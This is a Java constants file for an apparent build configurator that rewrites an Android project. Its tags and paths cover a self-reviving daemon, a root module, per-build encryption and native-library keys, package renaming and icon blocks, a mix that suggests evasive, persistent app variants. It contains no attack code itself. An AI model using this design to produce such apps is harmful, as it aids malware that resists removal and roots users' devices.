package com.common.config;

import java.io.File;

/**
 * Created by leejunpeng on 2016/3/10.
 */
public class Const {

    public static final String PATTERN = "[config]=";

    public static final String PROJECT_PATH = new File("").getAbsolutePath();
    public static final String CONFIG_SUB_PATH = File.separator + "prebuild" + File.separator + "config.json";
    public static final String CONFIG_VALUE_PATH = File.separator + "prebuild" + File.separator + "config_values.txt";

    //渠道相关
    public static final String CHANNEL_JAVA_PATH = "/archlib/src/main/java/com/curtain/arch/ChannelConfig.java";
    public static final String CHANNEL_TAG = "CHANNEL";
    public static final String CHANNEL_TEM = "*#*channel*#*";

    //接口相关
    public static final String CONSTANTS_JAVA_PATH = "/dexapp/src/main/java/com/curtain/koreyoshi/init/Constants.java";
    public static final String NETHEADUTIL_JAVA_PATH = "/archlib/src/main/java/com/curtain/arch/server/NetHeaderUtils.java";
    public static final String INTER_TAG_START = "//[config]=INTERFACE_START";
    public static final String INTER_TAG_END = "//[config]=INTERFACE_END";
    public static final String GROUP_TAG = "GROUP";

    //复活相关
    public static final String MANIFEST_XML_PATH = "/soprotect/src/main/AndroidManifest.xml";
    public static final String REVIEVEDAEMON_JAVA_PATH = "/dexapp/src/main/java/com/curtain/koreyoshi/daemon/Guardian.java";
    public static final String REVIVE_ACTION_TAG = "REVIVE_ACTION";
    public static final String REVIVE_ACTION_TEM = "*#*action*#*";

    //ByteCrypt相关
    public static final String BYTECRYPT_JAVA_PATH = "/cryptlib/src/main/java/com/common/crypt/ByteCrypt.java";
    public static final String BYTECRYPT_TAG1 = "BYTECRYPT_KEY1";
    public static final String BYTECRYPT_TAG2 = "BYTECRYPT_KEY2";
    public static final String BYTECRYPT_TEM = "*#*crypt*#*";

    //SO Key相关
    public static final String SO_CPP_KEY_PATH = "/soprotect/src/main/jni/loader.cpp";
    public static final String FTOC_KEY_PATH = "/soprotect/build.gradle";
    public static final String SO_CPP_TAG = "SO_CPP_KEY";
    public static final String SO_FTOC_TAG = "SO_FTOC_KEY";
    public static final String SO_KEY_TEM = "*#*so*#*";


    //包名修改相关
    public static final String PKG_NAME_TAG = "PKG_NAME";
    public static final String PKG_NAME_TEM = "*#*pkg*#*";

    //应用安装action相关
    public static final String DEXAPP_MANI_PATH = "/dexapp/src/main/AndroidManifest.xml";
    public static final String PKG_ADD_ACTION_TAG = "PACKAGE_ADD_ACTION";
    public static final String NOTI_CLICK_ACTION_TAG = "NOTI_CLICKED_ACTION";
    public static final String DEXAPP_CONSTANTS_JAVA_PATH = "/dexapp/src/main/java/com/curtain/koreyoshi/init/Constants.java";
    public static final String SOAPP_CONSTANTS_JAVA_PATH = "/soprotect/src/main/java/com/igold/pro/FieldConfig.java";


    //root相关
    public static final String EP_JAVA_PATH = "/rlib/src/main/java/com/curtain/fotalib/EP.java";
    public static final String EP_MAIN_CLASS_TAG = "EP_MAIN_CLAZZ";
    public static final String EP_MAIN_CLASS_TEM = "*#*epclass*#*";
    public static final String EP_PERMISSION_TAG_START = "<!-- [config]=EP_PERMISSION_START-->";
    public static final String EP_PERMISSION_TAG_END = "<!-- [config]=EP_PERMISSION_END-->";

    //icon相关
    public static final String ICON_TAG_START = "<!-- [config]=ICON_START-->";
    public static final String ICON_TAG_END = "<!-- [config]=ICON_END-->";

    //logLevel相关
    public static final String STRATRGYSP_JAVA_PATH = "/dexapp/src/main/java/com/curtain/koreyoshi/data/StrategySharedPreference.java";
    public static final String STATISTICS_JAVA_PATH = "/dexapp/src/main/java/com/curtain/koreyoshi/business/statistics/StatisticsUtil.java";
    public static final String LOG_LEVEL_TAG = "LOG_LEVEL";
    public static final String LOG_LEVEL_TEM = "*#*loglevel*#*";

}
